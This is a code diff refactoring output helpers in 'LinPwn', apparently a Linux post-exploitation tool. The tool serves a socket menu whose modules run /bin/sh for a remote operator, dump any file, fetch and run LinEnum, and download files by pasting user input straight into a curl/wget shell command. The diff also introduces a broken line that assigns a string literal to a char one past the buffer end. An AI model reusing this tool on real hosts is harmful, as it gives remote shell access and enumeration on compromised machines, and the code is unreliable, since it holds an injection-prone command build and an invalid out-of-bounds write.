@@ -45,24 +45,46 @@ void get_input(char *option) {
   }
 }
 
-void help() {
-  std::string newline = "\n\0";
-  std::string options = "\x1b[32mOptions \n";
+void new_line() {
+  std::string newline = "\n";
+
+  write(SD, newline.data(), newline.length());
+}
+
+void seperate() {
   std::string seperator = "====================================="
       "==========================\n";
+
+  write(SD, seperator.data(), seperator.length());
+}
+
+void green() {
+  std::string green = "\x1b[32m ";
+
+  write(SD, green.data(), green.length());
+}
+
+void none() {
+  std::string none = "none\n";
+
+  write(SD, none.data(), none.length());
+}
+
+void help() {
+  std::string options = "\x1b[32mOptions \n";
   std::string banner = "banner - displays the banner.\n";
   std::string modules = "modules - lists modules.\n";
   std::string clear = "clear - clears the screen.\n";
   std::string exits = "exit - or press ^C to quit LinPwn.\n";
 
-  write(SD, newline.data(), newline.length());
+  new_line();
   write(SD, options.data(), options.length());
-  write(SD, seperator.data(), seperator.length());
+  seperate();
   write(SD, banner.data(), banner.length());
   write(SD, modules.data(), modules.length());
   write(SD, clear.data(), clear.length());
   write(SD, exits.data(), exits.length());
-  write(SD, newline.data(), newline.length());
+  new_line();
 }
 
 class Banner {
@@ -81,11 +103,10 @@ class Banner {
 
  private:
   void get_banner() {
-    std::string newline = "\n\0";
     std::string title = "\x1b[32mLinPwn\nCreated By Andromeda.\n";
 
     write(SD, title.data(), title.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_sysinfo() {
@@ -97,7 +118,6 @@ class Banner {
     std::string version = utsinfo.version;
     std::string machine = utsinfo.machine;
     std::string domainname = utsinfo.domainname;
-    std::string newline = "\n\0";
     std::string systems = "System: ";
     std::string space = " ";
 
@@ -113,120 +133,107 @@ class Banner {
     write(SD, machine.data(), machine.length());
     write(SD, space.data(), space.length());
     write(SD, domainname.data(), domainname.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_user() {
-    std::string newline = "\n\0";
     std::string env = "User: ";
-    std::string none = "none\n";
     std::string username = getenv("USER");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("USER")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, username.data(), username.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_uid() {
     int uid = getuid();
-    std::string newline = "\n\0";
     std::string env = "UID: ";
     std::string uidstr = std::to_string(uid);
 
     write(SD, env.data(), env.length());
     write(SD, uidstr.data(), uidstr.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_pwd() {
-    std::string newline = "\n\0";
     std::string env = "Pwd: ";
-    std::string none = "none\n";
     std::string pwd = getenv("PWD");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("PWD")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, pwd.data(), pwd.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_home() {
-    std::string newline = "\n\0";
     std::string env = "Home: ";
-    std::string none = "none\n";
     std::string home = getenv("HOME");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("HOME")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, home.data(), home.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_shell() {
-    std::string newline = "\n\0";
     std::string env = "Shell: ";
-    std::string none = "none\n";
     std::string shell = getenv("SHELL");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("SHELL")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, shell.data(), shell.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_term() {
-    std::string newline = "\n\0";
     std::string env = "Term: ";
-    std::string none = "none\n";
     std::string term = getenv("TERM");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("TERM")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, term.data(), term.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 
   void get_path() {
-    std::string newline = "\n\0";
     std::string env = "Path: ";
-    std::string none = "none\n";
     std::string path = getenv("PATH");
 
     write(SD, env.data(), env.length());
 
     if (!getenv("PATH")) {
-      write(SD, none.data(), none.length());
+      none();
       return;
     }
 
     write(SD, path.data(), path.length());
-    write(SD, newline.data(), newline.length());
+    new_line();
   }
 };
 
@@ -251,33 +258,28 @@ class Connection {
 class Commands {
  public:
   void list_Modules() {
-    std::string newline = "\n\0";
     std::string modules = "\x1b[32mModules \n";
-    std::string seperator = "====================================="
-      "==========================\n";
     std::string shell = "shell - Executes /bin/sh\n";
     std::string read_file = "readfile - Print the contents of a file\n";
     std::string enumerate = "enumerate - Download and run LinEnum "
       "(requires internet access)\n";
     std::string download = "download - Downloads a file\n";
 
-    write(SD, newline.data(), newline.length());
+    new_line();
     write(SD, modules.data(), modules.length());
-    write(SD, seperator.data(), seperator.length());;
+    seperate();
     write(SD, shell.data(), shell.length());
     write(SD, read_file.data(), read_file.length());
     write(SD, enumerate.data(), enumerate.length());
     write(SD, download.data(), download.length());
-    write(SD, newline.data(), newline.length());;
+    new_line();
   }
 
   void shell() {
-    std::string green = "\x1b[32m ";
-    std::string shell = "\x1b[31m(LinPwn: Shell) > ";
+    std::string shell = "\x1b[31m(LinPwn: Shell) >";
     std::string exe = "\x1b[32mExecuting /bin/sh\n";
     std::string exits = "Type exit to return to LinPwn.\n";
     char option[BUFFER];
-    // const char *errors = " 2>/dev/null";
     const char *errors = " 2>&0";
 
     write(SD, exe.data(), exe.length());
@@ -285,7 +287,7 @@ class Commands {
 
     for (;;) {
       write(SD, shell.data(), shell.length());
-      write(SD, green.data(), green.length());
+      green();
       get_input(option);
 
       if (strncmp(option, "exit\0", 5) == 0) {
@@ -298,9 +300,9 @@ class Commands {
   }
 
   void read_file() {
-    std::string green = "\x1b[32m ";
     std::string contents = "\x1b[32mType full path of file"
       "to view contents...\n";
+    std::string read = "\x1b[31m(LinPwn: Readfile) >";
     std::string exits = "Type exit to return to LinPwn.\n";
     char option[BUFFER];
 
@@ -308,7 +310,8 @@ class Commands {
     write(SD, exits.data(), exits.length());
 
     for (;;) {
-      write(SD, green.data(), green.length());
+      write(SD, read.data(), read.length());
+      green();
       get_input(option);
 
       if (strncmp(option, "exit\0", 5) == 0) {
@@ -344,8 +347,7 @@ class Commands {
   void download() {
     std::string url = "\x1b[32mEnter the URL of the target "
       "file to download it\n";
-    std::string downloads = "\x1b[31m(LinPwn: Download) > ";
-    std::string green = "\x1b[32m ";
+    std::string downloads = "\x1b[31m(LinPwn: Download) >";
     std::string curl_error = "\x1b[33mCurl or Wget is not installed\n";
     char *command = new char[BUFFER];
     const char *curl = "curl ";
@@ -364,7 +366,7 @@ class Commands {
 
     write(SD, url.data(), url.length());
     write(SD, downloads.data(), downloads.length());
-    write(SD, green.data(), green.length());
+    green();
     get_input(option);
     strncat(command, option, BUFFER);
     strncat(command, errors, BUFFER);
@@ -391,7 +393,7 @@ class Commands {
     char *filecontent = new char[size];
 
     fread(filecontent, 1, size, file);
-    filecontent[size] = '\0';
+    filecontent[size] = "\0";
     send(SD, filecontent, size, 0);
     fclose(file);
     delete[] filecontent;
@@ -405,41 +407,39 @@ int handler() {
   char *option = new char[BUFFER];
   get_input(option);
 
-  if (strncmp(option, "shell\0", 6) == 0) {
+  if (strncmp(option, "shell\0", 6) == 0)
     commands.shell();
-  } else if (strncmp(option, "readfile\0", 9) == 0) {
+  else if (strncmp(option, "readfile\0", 9) == 0)
     commands.read_file();
-  } else if (strncmp(option, "enumerate\0", 9) == 0) {
+  else if (strncmp(option, "enumerate\0", 9) == 0)
     commands.enumeration();
-  } else if (strncmp(option, "modules\0", 9) == 0) {
+  else if (strncmp(option, "modules\0", 9) == 0)
     commands.list_Modules();
-  } else if (strncmp(option, "download\0", 9) == 0) {
+  else if (strncmp(option, "download\0", 9) == 0)
     commands.download();
-  } else if (strncmp(option, "exit\0", 5) == 0) {
+  else if (strncmp(option, "exit\0", 5) == 0)
     return 1;
-  } else if (strncmp(option, "clear\0", 6) == 0) {
+  else if (strncmp(option, "clear\0", 6) == 0)
     system("clear");
-  } else if (strncmp(option, "help\0", 5) == 0) {
+  else if (strncmp(option, "help\0", 5) == 0)
     help();
-  } else if (strncmp(option, "banner\0", 7) == 0) {
+  else if (strncmp(option, "banner\0", 7) == 0)
     banner.print_banner();
-  } else if (strncmp(option, "", 1) == 0) {
+  else if (strncmp(option, "", 1) == 0)
     return 0;
-  } else {
+  else
     write(SD, not_valid.data(), not_valid.length());
-  }
 
   delete[] option;
   return 0;
 }
 
 void main_loop() {
-  std::string linpwn = "\x1b[31m(LinPwn) > ";
-  std::string green = "\x1b[32m ";
+  std::string linpwn = "\x1b[31m(LinPwn) >";
 
   do {
     write(SD, linpwn.data(), linpwn.length());
-    write(SD, green.data(), green.length());
+    green();
   } while (handler() != 1);
 }
 
